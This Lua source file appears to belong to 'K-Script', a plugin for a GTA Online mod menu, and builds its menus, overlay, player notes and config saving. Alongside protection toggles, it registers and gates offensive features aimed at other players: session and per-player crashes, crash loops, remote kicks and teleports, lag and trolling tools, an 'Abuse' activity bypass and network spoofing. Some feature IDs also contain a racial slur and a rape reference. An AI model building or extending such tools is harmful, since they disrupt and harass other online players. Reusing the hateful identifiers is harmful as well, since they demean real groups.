    local elapsed = os.time() - (timerStart or os.time())
    lines[#lines + 1] = ""
    lines[#lines + 1] = "Transition Monitor:"
    lines[#lines + 1] = ("%s (%02d:%02d)"):format(tostring(stateName), math.floor(elapsed / 60), elapsed % 60)
  end

  infoTextCache.lines = lines
end

function updateDisplaySizeCache()
  local now = os.clock()
  if infoWindowCache.displayWidth ~= 0
    and infoWindowCache.displayHeight ~= 0
    and (now - infoWindowCache.lastDisplaySizeUpdate) < infoWindowCache.displaySizeInterval
  then
    return
  end

  infoWindowCache.lastDisplaySizeUpdate = now
  infoWindowCache.displayWidth, infoWindowCache.displayHeight = ImGui.GetDisplaySize()
end

function saveWindowPosCached()
  local now = os.clock()
  if (now - infoWindowCache.lastPosSave) < infoWindowCache.posSaveInterval then
    return
  end

  infoWindowCache.lastPosSave = now
  local x, y = ImGui.GetWindowPos()
  local stored = StoredPos.GameInfoDisplay

  if stored == nil or stored.x ~= x or stored.y ~= y then
    StoredPos.GameInfoDisplay = V2.New(x, y)
  end
end

function clampWindowPosCached()
  local now = os.clock()
  if (now - infoWindowCache.lastClamp) < infoWindowCache.clampInterval then
    return
  end

  infoWindowCache.lastClamp = now
  updateDisplaySizeCache()

  local x, y = ImGui.GetWindowPos()
  local width, height = ImGui.GetWindowSize()
  local clampedX = math.max(0, math.min(infoWindowCache.displayWidth - width, x))
  local clampedY = math.max(0, math.min(infoWindowCache.displayHeight - height, y))

  if clampedX ~= x or clampedY ~= y then
    ImGui.SetWindowPos(clampedX, clampedY)
  end
end

function drawInfoDisplay()
  if not gameInfoDisplay then
    return
  end

  updateInfoFeatureCache()
  rebuildInfoTextCache()

  if not infowindowPositionSet then
    local stored = StoredPos.GameInfoDisplay or V2.New(10, 210)
    ImGui.SetNextWindowPos(stored.x, stored.y, ImGuiCond.Always)
    ImGui.SetNextWindowSize(300, 0, ImGuiCond.Once)
    infowindowPositionSet = true

    if isDev then
      Logger.Log(eLogColor.GREEN, "K-Script", ("drawInfoDisplay applying pos X=%s Y=%s"):format(tostring(stored.x), tostring(stored.y)))
    end
  end

  local flags = ImGuiWindowFlags.AlwaysAutoResize | ImGuiWindowFlags.NoCollapse | ImGuiWindowFlags.NoScrollbar
  if not infoFeatureCache.isMovable then
    flags = flags | ImGuiWindowFlags.NoMove
  end

  local ok, opened = pcall(ImGui.Begin, "K-Script - Game Monitor", true, flags)
  if not ok then
    return
  end

  if opened then
    saveWindowPosCached()
    drawGeneralInfoLive()

    for _, line in ipairs(infoTextCache.lines) do
      ImGui.Text(line == "" and "" or tostring(line))
    end

    clampWindowPosCached()
  end

  ImGui.End()
end

function renderImGui()
  if isUnloading then
    return
  end

  if maintransitionActive and safeFeatureEnabledHash(H_TOGGLE_GAME_INFO_DISPLAY, true) and safeFeatureEnabledHash(H_INFO_TRANSITION, true) then
    local loading = DLC.GET_IS_LOADING_SCREEN_ACTIVE()
    local initialLoading = DLC.GET_IS_INITIAL_LOADING_SCREEN_ACTIVE()
    local noObjects = safePoolValue("GetMaxObjectCount", 0) == 0

    if noObjects or loading or initialLoading or initRun then
      if isDev then
        Logger.LogError(("Transition disabled | noObjects=%s loading=%s initialLoading=%s"):format(tostring(noObjects), tostring(loading), tostring(initialLoading)))
      end
      maintransitionActive = false
    end
  end

  modderDisplay = safeFeatureEnabledHash(H_TOGGLE_MODDER_DISPLAY, modderDisplay)
  gameInfoDisplay = safeFeatureEnabledHash(H_TOGGLE_GAME_INFO_DISPLAY, gameInfoDisplay)

  if modderDisplay then
    drawModders()
  end

  if gameInfoDisplay then
    drawInfoDisplay()
  end
end

function onReaction(playerId, protectionType)
  if protectionType == eProtectionType.VOTE_KICK then
    notify(("%s is voting to Kick You!"):format(Players.GetName(playerId) or ("Player " .. tostring(playerId))))
  end
end

local function safeRenderFeatureHash(hash, playerId)
  if ClickGUI == nil or ClickGUI.RenderFeature == nil or hash == nil then
    return false
  end

  local ok = pcall(ClickGUI.RenderFeature, hash, playerId)
  return ok == true
end

function renderClickFeature(featureName, playerId)
  local hash = type(featureName) == "number" and featureName or Utils.Joaat(tostring(featureName))
  return safeRenderFeatureHash(hash, playerId)
end

local function playerNotesPath()
  return FileMgr.GetMenuRootPath() .. "\\Lua\\K-Script\\PlayerNotes.json"
end

local function savePlayerNotes(notes)
  FileMgr.CreateDir(menuRootPath)
  return FileMgr.WriteFileContent(playerNotesPath(), json.encode(notes or {}))
end

function deletePlayerNote(key)
  key = tostring(key or "")
  if key == "" then
    return false
  end

  local notes = loadPlayerNotes()
  local removed = false

  if notes[key] ~= nil then
    notes[key] = nil
    removed = true
  else
    for noteKey, note in pairs(notes) do
      if type(note) == "table" and (tostring(note.name) == key or tostring(note.playerName) == key or tostring(note.rockstarId) == key) then
        notes[noteKey] = nil
        removed = true
        break
      end
    end
  end

  if removed then
    savePlayerNotes(notes)
    notify("Deleted player note: " .. key)
  end

  return removed
end

cursorPos = cursorPos or -1
fadeContentAlpha = fadeContentAlpha or 1
currentTab = currentTab or nil
lastTab = lastTab or nil
lastGUITab = lastGUITab or nil
fadeCurrentTab = fadeCurrentTab or nil
fadeLastTab = fadeLastTab or nil
fadeLastGUITab = fadeLastGUITab or nil
activeTabPath = activeTabPath or ""
lastActiveTabPath = lastActiveTabPath or ""
tabBarDepth = tabBarDepth or 0
activeTabLabelsByDepth = activeTabLabelsByDepth or {}
pendingContentSlide = pendingContentSlide or false
slideAppliedThisFrame = slideAppliedThisFrame or false

function lerp(startValue, endValue, amount)
  return startValue + ((endValue - startValue) * amount)
end

local function getFeatureFloat(name, fallback)
  local feature = safeFeature(name)
  if feature and feature.GetFloatValue then
    local ok, value = pcall(feature.GetFloatValue, feature)
    if ok and value ~= nil then
      return value
    end
  end
  return fallback
end

local function updateActiveTabPath()
  local path = {}
  for depth = 1, tabBarDepth do
    if activeTabLabelsByDepth[depth] ~= nil then
      path[#path + 1] = tostring(activeTabLabelsByDepth[depth])
    end
  end

  activeTabPath = table.concat(path, "/")

  if activeTabPath ~= "" and activeTabPath ~= currentTab then
    lastTab = currentTab
    currentTab = activeTabPath
    pendingContentSlide = true
    cursorPos = getFeatureInt("FeatureTransitionsPosition", -100)
    fadeContentAlpha = getFeatureFloat("FadeContentFadeInitialValue", 0.125)
  end
end

function TryApplySlideOffset()
  if slideAppliedThisFrame or not pendingContentSlide or not isFeatureEnabled("FeatureTransitions") then
    return
  end

  local offset = tonumber(cursorPos) or 0
  if math.abs(offset) < 0.5 then
    return
  end

  local x, y = ImGui.GetCursorPos()
  ImGui.SetCursorPos(x + offset, y)
  slideAppliedThisFrame = true
end

if not kscriptImGuiTransitionsWrapped then
  originalImGuiBeginTable = originalImGuiBeginTable or ImGui.BeginTable
  originalImGuiBeginTabItem = originalImGuiBeginTabItem or ImGui.BeginTabItem
  originalImGuiBeginTabBar = originalImGuiBeginTabBar or ImGui.BeginTabBar
  originalImGuiEndTabBar = originalImGuiEndTabBar or ImGui.EndTabBar

  ImGui.BeginTable = function(...)
    TryApplySlideOffset()
    return originalImGuiBeginTable(...)
  end

  ImGui.BeginTabItem = function(label, ...)
    local opened = originalImGuiBeginTabItem(label, ...)
    if opened then
      activeTabLabelsByDepth[tabBarDepth] = label
      updateActiveTabPath()
    end
    return opened
  end

  ImGui.BeginTabBar = function(label, ...)
    tabBarDepth = tabBarDepth + 1
    activeTabLabelsByDepth[tabBarDepth] = nil
    return originalImGuiBeginTabBar(label, ...)
  end

  ImGui.EndTabBar = function(...)
    activeTabLabelsByDepth[tabBarDepth] = nil
    tabBarDepth = math.max(0, tabBarDepth - 1)
    return originalImGuiEndTabBar(...)
  end

  kscriptImGuiTransitionsWrapped = true
end

local function textDisabled(text)
  if ImGui.TextDisabled then
    ImGui.TextDisabled(tostring(text))
  else
    ImGui.Text(tostring(text))
  end
end

local function sortedKeys(source)
  local keys = {}
  for key in pairs(source or {}) do
    keys[#keys + 1] = key
  end
  table.sort(keys, function(left, right)
    return tostring(left) < tostring(right)
  end)
  return keys
end

local function renderFeatureList(featureNames, playerId)
  for _, item in ipairs(featureNames or {}) do
    if type(item) == "table" then
      if item.when == nil or item.when() then
        renderClickFeature(item.id, playerId)
      end
    else
      renderClickFeature(item, playerId)
    end
  end
end

local function beginClickChild(title, columns)
  if ClickGUI and ClickGUI.BeginCustomChildWindow then
    return ClickGUI.BeginCustomChildWindow(title, columns)
  end
  return ImGui.BeginChild(title, 0, 0, true)
end

local function endClickChild()
  if ClickGUI and ClickGUI.EndCustomChildWindow then
    ClickGUI.EndCustomChildWindow()
  else
    ImGui.EndChild()
  end
end

local function renderChildSection(title, features, playerId, columns)
  if beginClickChild(title, columns) then
    renderFeatureList(features, playerId)
    endClickChild()
  end
end

local function renderOnlineUserBucket(title, hashes)
  if beginClickChild(title) then
    ImGui.Text(title)

    if hashes == nil or #hashes == 0 then
      textDisabled("No users found.")
    else
      for _, hash in ipairs(hashes) do
        safeRenderFeatureHash(hash)
      end
    end

    endClickChild()
  end
end

local function renderOnlineUsersClickUI()
  if ImGui.BeginTable("KScriptOnlineUsers", 2) then
    ImGui.TableNextColumn()
    renderOnlineUserBucket("Legacy Public", onlineUserFeatures.LegacyUsers.PublicUsers)
    renderOnlineUserBucket("Enhanced Public", onlineUserFeatures.EnhancedUsers.PublicUsers)
    ImGui.TableNextColumn()
    renderOnlineUserBucket("Legacy Private", onlineUserFeatures.LegacyUsers.NonPublicUsers)
    renderOnlineUserBucket("Enhanced Private", onlineUserFeatures.EnhancedUsers.NonPublicUsers)
    ImGui.EndTable()
  end
end

local function noteDisplayValue(note, key)
  if type(note) ~= "table" then
    return tostring(note), tostring(key), "Unknown", "Unknown"
  end

  local name = note.name or note.playerName or note.PlayerName or tostring(key)
  local rockstarId = note.rockstarId or note.rid or note.RockstarId or tostring(key)
  local text = note.note or note.text or note.message or note.reason or ""
  local updatedAt = note.updatedAt or note.createdAt or note.time or note.timestamp

  return tostring(name), tostring(rockstarId), tostring(text), formatTime(tonumber(updatedAt))
end

local function renderPlayerNotesPanel()
  local notes = loadPlayerNotes()
  if isTableEmpty(notes) then
    textDisabled("No player notes saved.")
    return
  end

  if ImGui.BeginTable("KScriptPlayerNotes", 5) then
    if ImGui.TableSetupColumn then
      ImGui.TableSetupColumn("Player")
      ImGui.TableSetupColumn("RID")
      ImGui.TableSetupColumn("Note")
      ImGui.TableSetupColumn("Updated")
      ImGui.TableSetupColumn("")
      ImGui.TableHeadersRow()
    end

    for key, note in pairs(notes) do
      local name, rid, text, updatedAt = noteDisplayValue(note, key)
      ImGui.TableNextRow()
      ImGui.TableNextColumn()
      ImGui.Text(name)
      ImGui.TableNextColumn()
      ImGui.Text(rid)
      ImGui.TableNextColumn()
      ImGui.Text(text)
      ImGui.TableNextColumn()
      ImGui.Text(updatedAt)
      ImGui.TableNextColumn()
      if ImGui.Button("Delete##note_" .. tostring(key)) then
        deletePlayerNote(key)
      end
    end

    ImGui.EndTable()
  end
end

local function renderEmoteFeatureTable(title, source)
  if beginClickChild(title) then
    for _, command in ipairs(sortedKeys(source)) do
      renderClickFeature(command)
    end
    endClickChild()
  end
end

local function renderSettingsTab()
  if ImGui.BeginTable("KScriptSettingsGrid", 2) then
    ImGui.TableNextColumn()
    renderChildSection("General", {
      "togglemodderdisplay",
      "togglegameinfodisplay",
      "infoShowGeneral",
      "infoShowPools",
      "infoShowHosts",
      "infoShowVoiceChat",
      "infoShowTransition",
      "dbug",
      "disabledraw",
      "discordRPCToggle",
      "AngelAIOnDeath",
      "AngelAIOnWeaponChange",
      {id = "ghostDetect", when = function()
        return isDev or isAdmin or isModerator or Cherax.GetUID() == 67472 or Cherax.GetUID() == 30117
      end},
      "savekscript",
      "loadkscript",
      "dcinvite",
    })

    ImGui.TableNextColumn()
    renderChildSection("Transitions", {
      "FeatureTransitions",
      "FeatureTransitionsPosition",
      "FeatureTransitionsTransitionSpeed",
      "FadeContent",
      "FadeContentFadeSpeed",
      "FadeContentFadeInitialValue",
    })

    ImGui.TableNextColumn()
    renderChildSection("Toast Position", {
      "ToggleOption",
      "ToastPresetPos",
      "ToastXOffset",
      "ToastYOffset",
      "FadeOutDuration",
    })

    ImGui.TableNextColumn()
    renderChildSection("Toast Colors", {
      "TitleColor",
      "MessageColor",
      "ProgressBarBG",
      "ProgressBarFG",
      "ToastBG",
    })

    ImGui.EndTable()
  end
end

function renderUnifiedTab()
  local pushedFade = false
  if fadeContentAlpha < 0.999 and isFeatureEnabled("FadeContent") and ImGuiStyleVar and ImGuiStyleVar.Alpha then
    local ok = pcall(ImGui.PushStyleVar, ImGuiStyleVar.Alpha, fadeContentAlpha)
    pushedFade = ok == true
  end

  if ImGui.BeginTabBar("KScriptRootTabBar") then
    if ImGui.BeginTabItem("User Joiner") then
      renderOnlineUsersClickUI()
      ImGui.EndTabItem()
    end

    if ImGui.BeginTabItem("Quality Of Life") then
      if ImGui.BeginTable("KScriptQolGrid", 3) then
        ImGui.TableNextColumn()
        renderChildSection("Louder Radio", {
          "louderRadion_Toggle",
          "louderRadio_volume",
          "louderRadio_size",
          "louderRadio_visibillityToggle",
          "louderRadio_groundToggle",
          "louderRadio_collisionToggle",
          "louderRadio_animToggle",
        })

        ImGui.TableNextColumn()
        renderChildSection("Spoofing", {
          "natSpoofCombo",
          "natSpoofToggle",
          "regionSpoofCombo",
          "regionSpoofToggle",
        })

        ImGui.TableNextColumn()
        renderChildSection("Vehicle", {
          "vehicleflymode",
        })

        ImGui.TableNextColumn()
        renderChildSection("Requests", {
          "poolToggle",
          "notifyToggle",
          "acceptAlerts",
          "skipReload",
        })

        ImGui.TableNextColumn()
        renderChildSection("Misc", {
          "fixcam",
          "stopfm",
          "rejoin",
        })

        ImGui.EndTable()
      end
      ImGui.EndTabItem()
    end

    if ImGui.BeginTabItem("Protections") then
      if ImGui.BeginTable("KScriptProtectionsGrid", 3) then
        ImGui.TableNextColumn()
        renderChildSection("Sync Protection", {
          "crashProt1",
          "PedProt2",
          "VehicleProt4",
          "ObjProt0",
          "closespawnProt5",
          "closespawnRadius8",
          "cacheBlockedEnts6",
          "clearcacheEnts9",
        })

        ImGui.TableNextColumn()
        renderChildSection("Net Protection", {
          "blockExplos3",
          "blockPTFX9",
        })

        ImGui.TableNextColumn()
        renderChildSection("Script Event Protection", {
          "scriptEventProtections",
          "blockSHcrash",
          "blockInfiniteLoading",
          "blockApartmentInvite",
          "blockRemoveWanted",
          "blockGiveWanted",
          "blockSoundSpam5k",
          "blockTickerMessage",
          "blockInsuranceScam",
          "blockPhoneInviteSpam",
          "blockMissionInvite",
          "blockMissionConfirm",
          "notifyProtections",
        })

        ImGui.EndTable()
      end
      ImGui.EndTabItem()
    end

    if ImGui.BeginTabItem("Session") then
      if ImGui.BeginTable("KScriptSessionGrid", 3) then
        ImGui.TableNextColumn()
        renderChildSection("Session", {
          "crashAllk",
          {id = "sigTest", when = function() return isAdmin or isSupporter end},
          {id = "InvalidPhoneGesturev54", when = function() return isAdmin or isSupporter end},
          "rejoin",
        })

        ImGui.TableNextColumn()
        renderChildSection("Session Utils", {
          "fixcam",
          "acceptAlerts",
          "stopfm",
        })

        ImGui.TableNextColumn()
        renderChildSection("Session Purifier", {
          "PurificationMain",
          "SessionPurifierAutocrash",
          "purification_search",
          "crashProt1",
          "blockExplos3",
          "blockPTFX9",
          "clearcacheEnts9",
        })

        if isAdmin then
          ImGui.TableNextColumn()
          renderChildSection("crash Loop", {
            "KScript-crashLoopTextInput",
            "crashLoopTextInputEnabled",
            "crashbot",
            "crashloop",
          })
        end

        ImGui.TableNextColumn()
        if beginClickChild("Player Notes", 2) then
          renderPlayerNotesPanel()
          endClickChild()
        end

        ImGui.EndTable()
      end
      ImGui.EndTabItem()
    end

    if ImGui.BeginTabItem("Emotes") then
      if ImGui.BeginTable("KScriptEmoteGrid", 3) then
        ImGui.TableNextColumn()
        renderEmoteFeatureTable("Emotes", Emotes)
        ImGui.TableNextColumn()
        renderEmoteFeatureTable("Dances", Dances)
        ImGui.TableNextColumn()
        renderEmoteFeatureTable("Prop Emotes", PropEmotes)
        ImGui.EndTable()
      end
      ImGui.EndTabItem()
    end

    if isDev and ImGui.BeginTabItem("Test Area") then
      renderChildSection("Debug", {
        "entityCreationLogger",
        "chinatrolltest",
        "dbug",
      })
      ImGui.EndTabItem()
    end

    if ImGui.BeginTabItem("Settings") then
      renderSettingsTab()
      ImGui.EndTabItem()
    end

    ImGui.EndTabBar()
  end

  if pushedFade then
    pcall(ImGui.PopStyleVar)
  end
end

local playerRemovalFeatures = {
  "zerocrash",
  "ncrash",
  "lexisSkid",
  "synccrash",
  "TempVehicle3",
  {id = "pBigBraincrash", when = function() return isAdmin or isSupporter end},
  {id = "pBigBraincrashV8", when = function() return isAdmin or isSupporter end},
  {id = "goofycrash", when = function() return isAdmin or isSupporter end},
  {id = "standcrash", when = function() return isAdmin or isSupporter end},
  {id = "vehlightCwash", when = function() return isAdmin or isSupporter end},
  {id = "invalidPoolDelete0", when = function() return isAdmin or isSupporter end},
  {id = "InvalidPhoneGesture6", when = function() return isAdmin or isSupporter end},
  {id = "InvalidMComp4", when = function() return isAdmin or isSupporter end},
  {id = "1/33 cwash", when = function() return isAdmin end},
  {id = "niggercrash", when = function() return isAdmin end},
  {id = "rapeLexis", when = function() return isAdmin or isSupporter end},
  {id = "tugspam", when = function() return isAdmin or isSupporter end},
  {id = "spongebobc", when = function() return isAdmin or isSupporter end},
}

local playerTrollingFeatures = {
  "lexisSkid7",
  "lexisSkid1",
  "Invalid claim notification",
  {id = "invflag", when = function() return isAdmin or isSupporter end},
  {id = "SpawnWindmillAtRemotePlayerFeet", when = function() return isAdmin or isSupporter end},
  {id = "OPTrollingCarfrfr", when = function() return isAdmin or isSupporter end},
  {id = "singleplayerwarp9", when = function() return isDev end},
  {id = "largeObjDmp0", when = function() return isAdmin or isSupporter end},
  {id = "largeObjDmp4", when = function() return isAdmin or isSupporter end},
  {id = "largeObjDmpCleanup8", when = function() return isAdmin or isSupporter end},
  {id = "largeObjDmpCleanup9", when = function() return isAdmin or isSupporter end},
  {id = "tugLagger", when = function() return isAdmin or isSupporter end},
  {id = "glitchP2", when = function() return isAdmin or isSupporter end},
  {id = "glitchP5", when = function() return isAdmin or isSupporter end},
  {id = "cargoglitch0", when = function() return isAdmin or isSupporter end},
  {id = "cargoglitch8", when = function() return isAdmin or isSupporter end},
  {id = "pyroTroll5", when = function() return isAdmin or isSupporter end},
  {id = "flipper5", when = function() return isAdmin or isSupporter end},
  {id = "flipper3", when = function() return isAdmin or isSupporter end},
  {id = "pyroTroll8", when = function() return isAdmin or isSupporter end},
}

function renderPlayerTabClickUI(playerId)
  playerId = tonumber(playerId) or (ClickGUI.GetSelectedPlayer and ClickGUI.GetSelectedPlayer()) or 0

  if ImGui.BeginTable("KScriptPlayerTabGrid", 3) then
    ImGui.TableNextColumn()
    renderChildSection("Removals", playerRemovalFeatures, playerId)

    ImGui.TableNextColumn()
    renderChildSection("Trolling", playerTrollingFeatures, playerId)

    if isAdmin or isSupporter then
      ImGui.TableNextColumn()
      if beginClickChild("Abuse", 1) then
        ImGui.Text("Activity Bypass:")
        for _, activityFeature in pairs(activities) do
          renderClickFeature(activityFeature, playerId)
        end
        renderClickFeature("interactionLoop", playerId)
        endClickChild()
      end
    end

    ImGui.TableNextColumn()
    renderChildSection("Host Share", {
      "remotehostkick",
      {id = "remoteunload", when = function() return isAdmin or isSupporter end},
      {id = "RemoteTP", when = function() return isAdmin or isSupporter end},
      {id = "remotecrash", when = function() return isDev end},
    }, playerId)

    ImGui.TableNextColumn()
    renderChildSection("General", {
      "AutoTPToPlayer",
    }, playerId)

    ImGui.EndTable()
  end
end

local function getOrAddSubTab(parent, label, description)
  if parent == nil then
    return nil
  end

  local ok, existing = pcall(parent.GetSubTab, parent, label)
  if ok and existing then
    return existing
  end

  local createdOk, created = pcall(parent.AddSubTab, parent, label, description or "")
  if createdOk then
    return created
  end

  return nil
end

local function addListFeature(tab, featureName, playerId)
  if tab == nil then
    return
  end

  local hash = type(featureName) == "number" and featureName or Utils.Joaat(tostring(featureName))
  pcall(tab.AddFeature, tab, hash, playerId)
end

local function addListFeatures(tab, featureNames, playerId)
  for _, item in ipairs(featureNames or {}) do
    if type(item) == "table" then
      if item.when == nil or item.when() then
        addListFeature(tab, item.id, playerId)
      end
    else
      addListFeature(tab, item, playerId)
    end
  end
end

function renderListUI()
  if ListGUI == nil then
    return
  end

  local root = ListGUI.GetRootTab()
  if root then
    local mainTab = getOrAddSubTab(root, "K-Script", "")
    if mainTab then
      addListFeatures(getOrAddSubTab(mainTab, "Session crashes"), {
        "crashAllk",
        {id = "sigTest", when = function() return isAdmin or isSupporter end},
        {id = "InvalidPhoneGesturev54", when = function() return isAdmin or isSupporter end},
      })
      addListFeatures(getOrAddSubTab(mainTab, "Session Utils"), {"rejoin"})
      addListFeatures(getOrAddSubTab(mainTab, "Vehicle Options"), {"vehicleflymode"})
      addListFeatures(getOrAddSubTab(mainTab, "Weapon Options"), {"skipreload", "skipReload"})
      addListFeatures(getOrAddSubTab(mainTab, "Spoofing Options"), {
        "natSpoofCombo",
        "natSpoofToggle",
        "regionSpoofCombo",
        "regionSpoofToggle",
      })
      addListFeatures(getOrAddSubTab(mainTab, "Louder Radio"), {
        "louderRadion_Toggle",
        "louderRadio_volume",
        "louderRadio_size",
        "louderRadio_visibillityToggle",
        "louderRadio_groundToggle",
        "louderRadio_collisionToggle",
        "louderRadio_animToggle",
      })
      addListFeatures(getOrAddSubTab(mainTab, "Misc"), {"fixcam", "acceptAlerts", "stopfm"})
      addListFeatures(getOrAddSubTab(mainTab, "Settings"), {
        "togglemodderdisplay",
        "togglegameinfodisplay",
        "infoShowGeneral",
        "infoShowPools",
        "infoShowHosts",
        "infoShowVoiceChat",
        "infoShowTransition",
        "dbug",
        "disabledraw",
        "discordRPCToggle",
        "AngelAIOnDeath",
        "AngelAIOnWeaponChange",
        "ghostDetect",
        "savekscript",
        "loadkscript",
        "dcinvite",
      })

      if isAdmin then
        addListFeatures(getOrAddSubTab(mainTab, "crash Loop"), {
          "KScript-crashLoopTextInput",
          "crashLoopTextInputEnabled",
          "crashbot",
          "crashloop",
        })
      end

      addListFeatures(getOrAddSubTab(mainTab, "Session Purifier"), {
        "PurificationMain",
        "SessionPurifierAutocrash",
        "purification_search",
      })

      local protectionTab = getOrAddSubTab(mainTab, "Protections")
      addListFeatures(protectionTab, {
        "crashProt1",
        "PedProt2",
        "VehicleProt4",
        "ObjProt0",
        "closespawnProt5",
        "closespawnRadius8",
        "cacheBlockedEnts6",
        "clearcacheEnts9",
        "blockExplos3",
        "blockPTFX9",
        "scriptEventProtections",
        "blockSHcrash",
        "blockInfiniteLoading",
        "blockApartmentInvite",
        "blockRemoveWanted",
        "blockGiveWanted",
        "blockSoundSpam5k",
        "blockTickerMessage",
        "blockInsuranceScam",
        "blockPhoneInviteSpam",
        "blockMissionInvite",
        "blockMissionConfirm",
        "notifyProtections",
      })

      addListFeature(mainTab, "unloadKScript")
    end
  end

  for playerId = 0, 31 do
    local playerTab = ListGUI.GetPlayerTab(playerId)
    if playerTab then
      local kscriptTab = getOrAddSubTab(playerTab, "K-Script", "")
      addListFeatures(getOrAddSubTab(kscriptTab, "Removals"), playerRemovalFeatures, playerId)
      addListFeatures(getOrAddSubTab(kscriptTab, "Trolling"), playerTrollingFeatures, playerId)

      if isAdmin or isSupporter then
        local abuseTab = getOrAddSubTab(kscriptTab, "Abuse")
        for _, activityFeature in pairs(activities) do
          addListFeature(abuseTab, activityFeature, playerId)
        end
        addListFeature(abuseTab, "interactionLoop", playerId)
      end

      addListFeatures(getOrAddSubTab(kscriptTab, "Host Share"), {
        "remotehostkick",
        {id = "remoteunload", when = function() return isAdmin or isSupporter end},
        {id = "RemoteTP", when = function() return isAdmin or isSupporter end},
        {id = "remotecrash", when = function() return isDev end},
      }, playerId)
      addListFeatures(getOrAddSubTab(kscriptTab, "General"), {"AutoTPToPlayer"}, playerId)
    end
  end
end

lastRenderMode = lastRenderMode or nil
clickGuiRegistered = clickGuiRegistered or false
listGuiRegistered = listGuiRegistered or false

function RenderModeWatcher()
  if ShouldUnload() then
    return
  end

  if not logOnce then
    Script.Yield(500)
    return
  end

  local mode = GUI.GetMode()
  if mode ~= lastRenderMode then
    if mode == eGuiMode.ClickGUI and not clickGuiRegistered then
      Logger.Log(eLogColor.GREEN, "K-Script", "Detected ClickUI")
      ClickGUI.AddTab("K-Script", renderUnifiedTab)
      ClickGUI.AddPlayerTab("K-Script", renderPlayerTabClickUI)
      clickGuiRegistered = true
    elseif mode == eGuiMode.ListGUI then
      Logger.Log(eLogColor.GREEN, "K-Script", "Detected ListUI")
      renderListUI()
      listGuiRegistered = true
    end

    lastRenderMode = mode
  end

  Script.Yield(500)
end

function NodeDataLogUtillity(isCreate, modelHash, _position, meta, nodes)
  if not isFeatureEnabled("dbug") then
    return true
  end

  local mode = isCreate and "CREATE" or "SYNC"
  local modelName = GTA.GetModelNameFromHash(modelHash) or tostring(modelHash)
  local sourceName = meta and Players.GetName(meta.PlayerId) or "Unknown"
  Logger.LogInfo(("[%s] %s (0x%X) nodes=%d from %s"):format(mode, modelName, modelHash, #(nodes or {}), sourceName))

  for _, node in ipairs(nodes or {}) do
    local ok, nodeName = pcall(function()
      if node.GetNodeName then
        return node:GetNodeName()
      end
      return tostring(node:GetNodeType())
    end)

    if ok then
      Logger.LogInfo(" - " .. tostring(nodeName))
    end
  end

  return true
end

ensureToggleFeature("AngelAIOnWeaponChange", "Angel AI Weapon Lines", "Play Angel AI speech when changing weapons.", false)
ensureToggleFeature("AngelAIOnDeath", "Angel AI Respawn Lines", "Play Angel AI speech after respawning.", false)
ensureToggleFeature("skipReload", "Skip Reload", "Reserved compatibility toggle for weapon reload helpers.", false)
ensureToggleFeature("skipreload", "Skip Reload", "Reserved compatibility toggle for weapon reload helpers.", false)

local function isPhoneAppRunning()
  for _, scriptName in ipairs({"appinternet", "appcamera", "cellphone_flashhand"}) do
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(Utils.Joaat(scriptName)) > 0 then
      return true
    end
  end
  return false
end

local function playAngelAiLine(maleLine, femaleLine, voice)
  local ped = PLAYER.PLAYER_PED_ID()
  local coords = V3.New(ENTITY.GET_ENTITY_COORDS(ped, false))
  local model = ENTITY.GET_ENTITY_MODEL(ped)
  local maleModels = {
    [Utils.Joaat("MP_M_Freemode_34")] = true,
    [Utils.Joaat("MP_M_Freemode_45")] = true,
    [Utils.Joaat("MP_M_Freemode_67")] = true,
  }
  local speech = maleModels[model] and maleLine or femaleLine
  Natives.InvokeVoid(-1340946686285742523, speech, voice, coords.x, coords.y, coords.z, "SPEECH_PARAMS_FORCE")
end

function onWeaponChangeAngelAI()
  if not isFeatureEnabled("AngelAIOnWeaponChange") or isPhoneAppRunning() then
    return
  end

  playAngelAiLine("XM03_WEAPONS_PURCHASED_MALE", "XM70_WEAPONS_PURCHASED_FEMALE", "XM47_AISECRETARY")
end

function onPedRespawnAngelAI()
  if not isFeatureEnabled("AngelAIOnDeath") then
    return
  end

  playAngelAiLine("XM25_GYM_MALE", "XM47_GYM_FEMALE", "XM69_AISECRETARY")
end

local function readFeatureConfigValue(feature)
  local ok, featureType = pcall(feature.GetType, feature)
  if not ok then
    return nil
  end

  if featureType == eFeatureType.Toggle and feature.IsToggled then
    local valueOk, value = pcall(feature.IsToggled, feature)
    return valueOk and value or nil
  elseif featureType == eFeatureType.Combo and feature.GetListIndex then
    local valueOk, value = pcall(feature.GetListIndex, feature)
    return valueOk and value or nil
  elseif (featureType == eFeatureType.SliderInt or featureType == eFeatureType.InputInt) and feature.GetIntValue then
    local valueOk, value = pcall(feature.GetIntValue, feature)
    return valueOk and value or nil
  elseif featureType == eFeatureType.SliderFloat and feature.GetFloatValue then
    local valueOk, value = pcall(feature.GetFloatValue, feature)
    return valueOk and value or nil
  elseif featureType == eFeatureType.InputText and feature.GetStringValue then
    local valueOk, value = pcall(feature.GetStringValue, feature)
    return valueOk and value or nil
  elseif featureType == eFeatureType.InputColor4 and feature.GetColor then
    local valueOk, r, g, b, a = pcall(feature.GetColor, feature)
    if valueOk then
      return {r, g, b, a}
    end
  end

  return nil
end

function saveDefaultConfig()
  local encoded = {
    savedAt = os.time(),
    features = {},
  }

  for hash, name in pairs(registeredFeatures.hashAndName) do
    local feature = FeatureMgr.GetFeature(hash)
    if feature then
      local value = readFeatureConfigValue(feature)
      if value ~= nil then
        encoded.features[tostring(hash)] = {
          name = name,
          value = value,
        }
      end
    end
  end

  if StoredPos.GameInfoDisplay then
    encoded.features.GameInfoDisplayPosX = {value = StoredPos.GameInfoDisplay.x}
    encoded.features.GameInfoDisplayPosY = {value = StoredPos.GameInfoDisplay.y}
  end

  if StoredPos.ModderDisplay then
    encoded.features.ModderDisplayPosX = {value = StoredPos.ModderDisplay.x}
    encoded.features.ModderDisplayPosY = {value = StoredPos.ModderDisplay.y}
  end

  FileMgr.CreateDir(menuRootPath)
  if FileMgr.WriteFileContent(menuRootPath .. "\\DefaultConfig.json", json.encode(encoded)) then
    notify("Default config saved successfully!")
  else
    notify("Failed to save default config.")
  end
end

FeatAdd(Utils.Joaat("savekscript"), "Save Default Config", eFeatureType.Button, "Save K-Script feature values.", function()
  Script.QueueJob(saveDefaultConfig)
end)

FeatAdd(Utils.Joaat("loadkscript"), "Load Default Config", eFeatureType.Button, "Load K-Script feature values.", function()
  Script.QueueJob(loadDefaultConfig)
end)

FeatAdd(Utils.Joaat("dcinvite"), "Discord Invite", eFeatureType.Button, "Show the K-Script Discord invite.", function()
  notify("https://discord.gg/k-script")
end)

